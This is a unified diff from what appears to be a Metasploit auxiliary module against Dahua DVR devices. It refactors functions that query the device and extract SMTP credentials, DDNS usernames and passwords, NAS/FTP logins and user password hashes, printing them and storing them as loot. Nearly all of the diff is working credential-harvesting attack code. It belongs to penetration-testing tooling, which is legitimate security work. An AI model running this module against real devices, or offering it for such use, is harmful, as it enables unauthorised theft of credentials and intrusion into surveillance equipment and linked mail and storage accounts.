@@ -103,25 +103,24 @@ class Metasploit3 < Msf::Auxiliary
   def grab_email
     connect
     sock.put(EMAIL)
-    if data = sock.get_once.split('&&')
-      print_status("Email Settings: @ #{rhost}:#{rport}!")
-      if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\.?+:\d+)/i
-        if mailhost = Regexp.last_match[1].split(':')
-          print_status("  Server: #{mailhost[0]}") unless mailhost[0].nil?
-          print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].nil?
-          print_status("  Destination Email: #{data[1]}") unless mailhost[1].nil?
-        end
-        if !data[5].nil? && !data[6].nil?
-          print_good("  SMTP User: #{data[5]}") unless data[5].nil?
-          print_good("  SMTP Password: #{data[6]}") unless data[6].nil?
-          muser = "#{data[5]}"
-          mpass = "#{data[6]}"
-          mailserver = "#{mailhost[0]}"
-          mailport = "#{mailhost[1]}"
-          if !mailserver.to_s.strip.length == 0 && !mailport.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
-            report_email_creds(mailserver, mailport, muser, mpass) if !mailserver.nil? && !mailport.nil? && !muser.nil? && !mpass.nil?
-          end
-        end
+    return unless (response = sock.get_once)
+    data = response.split('&&')
+    return unless data.first =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\.?+:\d+)/i
+    print_status("Email Settings: @ #{rhost}:#{rport}!")
+    if mailhost = Regexp.last_match[1].split(':')
+      print_status("  Server: #{mailhost[0]}") unless mailhost[0].nil?
+      print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].nil?
+      print_status("  Destination Email: #{data[1]}") unless mailhost[1].nil?
+    end
+    if !data[5].nil? && !data[6].nil?
+      print_good("  SMTP User: #{data[5]}") unless data[5].nil?
+      print_good("  SMTP Password: #{data[6]}") unless data[6].nil?
+      muser = "#{data[5]}"
+      mpass = "#{data[6]}"
+      mailserver = "#{mailhost[0]}"
+      mailport = "#{mailhost[1]}"
+      if !mailserver.to_s.strip.length == 0 && !mailport.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
+        report_email_creds(mailserver, mailport, muser, mpass) if !mailserver.nil? && !mailport.nil? && !muser.nil? && !mpass.nil?
       end
     end
   end
@@ -129,28 +128,26 @@ class Metasploit3 < Msf::Auxiliary
   def grab_ddns
     connect
     sock.put(DDNS)
-    if data = sock.get_once
-      data = data.split(/&&[0-1]&&/)
-      data.each_with_index do |val, index|
-        if index > 0
-          val = val.split("&&")
-          ddns_service = "#{val[0]}"
-          ddns_server = "#{val[1]}"
-          ddns_port = "#{val[2]}"
-          ddns_domain = "#{val[3]}"
-          ddns_user = "#{val[4]}"
-          ddns_pass = "#{val[5]}"
-          print_status("DDNS Settings @ #{rhost}:#{rport}!:")
-          print_status("  DDNS Service: #{ddns_service}")
-          print_status("  DDNS Server:  #{ddns_server}")
-          print_status("  DDNS Port: #{ddns_port}")
-          print_status("  Domain: #{ddns_domain}")
-          print_good("  Username: #{ddns_user}")
-          print_good("  Password: #{ddns_pass}")
-          if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
-            report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
-          end
-        end
+    return unless (response = sock.get_once)
+    data = response.split(/&&[0-1]&&/)
+    data.each_with_index do |val, index|
+      next if index == 0
+      val = val.split("&&")
+      ddns_service = "#{val[0]}"
+      ddns_server = "#{val[1]}"
+      ddns_port = "#{val[2]}"
+      ddns_domain = "#{val[3]}"
+      ddns_user = "#{val[4]}"
+      ddns_pass = "#{val[5]}"
+      print_status("DDNS Settings @ #{rhost}:#{rport}!:")
+      print_status("  DDNS Service: #{ddns_service}")
+      print_status("  DDNS Server:  #{ddns_server}")
+      print_status("  DDNS Port: #{ddns_port}")
+      print_status("  Domain: #{ddns_domain}")
+      print_good("  Username: #{ddns_user}")
+      print_good("  Password: #{ddns_pass}")
+      if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
+        report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
       end
     end
   end
@@ -158,28 +155,29 @@ class Metasploit3 < Msf::Auxiliary
   def grab_nas
     connect
     sock.put(NAS)
-    if data = sock.get_once
-      print_status("Nas Settings @ #{rhost}:#{rport}!:")
-      server = ''
-      port = ''
-      if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
-        server = Regexp.last_match[1].unpack('C*').join('.')
-        port = Regexp.last_match[2].unpack('S')
-        print_status("  Nas Server #{server}")
-        print_status("  Nas Port: #{port}")
-      end
-      if data =~ /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/
+    return unless (data = sock.get_once)
+    print_status("Nas Settings @ #{rhost}:#{rport}!:")
+    server = ''
+    port = ''
+    if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
+      server = Regexp.last_match[1].unpack('C*').join('.')
+      port = Regexp.last_match[2].unpack('S')
+      print_status("  Nas Server #{server}")
+      print_status("  Nas Port: #{port}")
+    end
+    if /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/ =~ data
+      ftpuser.strip!
+      ftppass.strip!
+      unless ftpuser.blank? || ftppass.blank?
         print_good("  FTP User: #{ftpuser}")
         print_good("  FTP Password: #{ftppass}")
-        if !ftpuser.to_s.strip.length == 0 && ftppass.to_s.strip.length == 0
-          report_creds(
-            host: server,
-            port: port,
-            user: ftpuser,
-            pass: ftppass,
-            type: "FTP",
-            active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
-        end
+        report_creds(
+          host: server,
+          port: port,
+          user: ftpuser,
+          pass: ftppass,
+          type: "FTP",
+          active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
       end
     end
   end
@@ -198,40 +196,40 @@ class Metasploit3 < Msf::Auxiliary
   def grab_users
     connect
     sock.put(USERS)
-    if data = sock.get_once.split('&&')
-      usercount = 0
-      print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
-      data.each do |val|
-        usercount += 1
-        pass = "#{val[/(([\d]+)[:]([0-9A-Z]+)[:]([0-9A-Z]+))/i]}"
-        value = pass.split(":")
-        user = "#{value[1]}"
-        md5hash = "#{value[2]}"
-        print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
-        # Write the dahua hash to the database
-        hash = "#{rhost} #{user}:$dahua$#{md5hash}"
-        report_hash(rhost, rport, user, hash)
-        # Write the vulnerability to the database
-        report_vuln(
-          host: rhost,
-          port: rport,
-          proto: 'tcp',
-          sname: 'dvr',
-          name: 'Dahua Authentication Password Hash Exposure',
-          info: "Obtained password hash for user #{user}: #{md5hash}",
-          refs: references
-        )
-      end
+    return unless (response = sock.get_once)
+    data = response.split('&&')
+    usercount = 0
+    print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
+    data.each do |val|
+      usercount += 1
+      pass = "#{val[/(([\d]+)[:]([0-9A-Z]+)[:]([0-9A-Z]+))/i]}"
+      value = pass.split(":")
+      user = "#{value[1]}"
+      md5hash = "#{value[2]}"
+      print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
+      # Write the dahua hash to the database
+      hash = "#{rhost} #{user}:$dahua$#{md5hash}"
+      report_hash(rhost, rport, user, hash)
+      # Write the vulnerability to the database
+      report_vuln(
+        host: rhost,
+        port: rport,
+        proto: 'tcp',
+        sname: 'dvr',
+        name: 'Dahua Authentication Password Hash Exposure',
+        info: "Obtained password hash for user #{user}: #{md5hash}",
+        refs: references
+      )
     end
   end
 
   def grab_groups
     connect
     sock.put(GROUPS)
-    if data = sock.get_once.split('&&')
-      print_good("#{peer} -- groups:")
-      data.each { |val| print_status("  #{val[/(([\d]+)[:]([\w]+))/]}") }
-    end
+    return unless (response = sock.get_once)
+    data = response.split('&&')
+    print_good("#{peer} -- groups:")
+    data.each { |val| print_status("  #{val[/(([\d]+)[:]([\w]+))/]}") }
   end
 
   def reset_user
